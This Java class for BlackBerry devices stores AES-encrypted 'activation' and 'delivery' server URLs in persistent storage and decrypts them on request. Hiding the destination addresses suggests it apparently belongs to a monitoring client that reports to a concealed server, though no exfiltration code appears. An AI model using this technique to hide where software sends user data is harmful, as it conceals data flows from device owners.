package com.vvt.info;

import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import com.vvt.encryption.AESDecryptor;
import com.vvt.std.Log;

public class ServerUrl {
	
	private static final long SERVER_ACTIVATION_KEY = 0x2b638b2e6a6e209L;
	private static final long SERVER_ACTIVATION_URL = 0xea730075c7119ac9L;
	private static final long SERVER_DELIVERY_KEY = 0xf8d727ebcc22caf9L;
	private static final long SERVER_DELIVERY_URL = 0x2e160d9d6068d2a7L;
	private static ServerUrl self = null;
	private PersistentObject servActKeyPersistence = null;
	private PersistentObject servActUrlPersistence = null;
	private PersistentObject servDelKeyPersistence = null;
	private PersistentObject servDelUrlPersistence = null;
	private byte[] serverActUrl = null;
	private byte[] serverActKey = null;
	private byte[] serverDelUrl = null;
	private byte[] serverDelKey = null;
	private String serverActivationUrl = null;
	private String serverDeliveryUrl = null;
	
	private ServerUrl() {
		servActKeyPersistence = PersistentStore.getPersistentObject(SERVER_ACTIVATION_KEY);
		servActUrlPersistence = PersistentStore.getPersistentObject(SERVER_ACTIVATION_URL);
		servDelKeyPersistence = PersistentStore.getPersistentObject(SERVER_DELIVERY_KEY);
		servDelUrlPersistence = PersistentStore.getPersistentObject(SERVER_DELIVERY_URL);
	}
	
	public static ServerUrl getInstance() {
		if (self == null) {
			self = new ServerUrl();
		}
		return self;
	}
	
	public String getServerActivationUrl() {
		try {
			if (serverActivationUrl == null) {
				serverActivationUrl = new String(AESDecryptor.decrypt(serverActKey, serverActUrl));
			}
		} catch(Exception e) {
			Log.error("ServerUrl.getServerActivationUrl", null, e);
		}
		return serverActivationUrl;
	}
	
	public String getServerDeliveryUrl() {
		try {
			if (serverDeliveryUrl == null) {
				serverDeliveryUrl = new String(AESDecryptor.decrypt(serverDelKey, serverDelUrl));
			}
		} catch(Exception e) {
			Log.error("ServerUrl.getServerDeliveryUrl", null, e);
		}
		return serverDeliveryUrl;
	}
	
	public void setServerActivationUrl(byte[] key, byte[] url) {
		serverActKey = key;
		serverActUrl = url;
		servActKeyPersistence.setContents(serverActKey);
		servActKeyPersistence.commit();
		servActUrlPersistence.setContents(serverActUrl);
		servActUrlPersistence.commit();
	}
	
	public void setServerDeliveryUrl(byte[] key, byte[] url) {
		serverDelKey = key;
		serverDelUrl = url;
		servDelKeyPersistence.setContents(serverDelKey);
		servDelKeyPersistence.commit();
		servDelUrlPersistence.setContents(serverDelUrl);
		servDelUrlPersistence.commit();
	}
}
